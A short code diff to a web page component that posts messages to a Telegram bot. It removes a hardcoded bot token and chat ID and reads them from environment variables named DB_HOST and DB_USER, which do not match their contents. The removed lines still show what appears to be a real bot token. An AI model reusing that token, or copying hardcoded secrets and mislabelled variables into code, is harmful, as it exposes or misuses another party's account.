@@ -40,17 +40,14 @@ export default function page() {
     },
   });
 
-  const TELEGRAM_BOT_TOKEN = "7942842686:AAE9oKyuPJmRfPBYu-pcmQTWPC3xdE_A9Rc";
-  const CHAT_ID = "-4563701305"; // Replace with your group chat ID
-
   // Function to send message
   const sendMessageToTelegram = async (message: string) => {
     setValidating(true);
     try {
       const response = await axios.post(
-        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+        `https://api.telegram.org/bot${process.env.DB_HOST}/sendMessage`,
         {
-          chat_id: CHAT_ID,
+          chat_id: process.env.DB_USER,
           text: message,
         }
       );
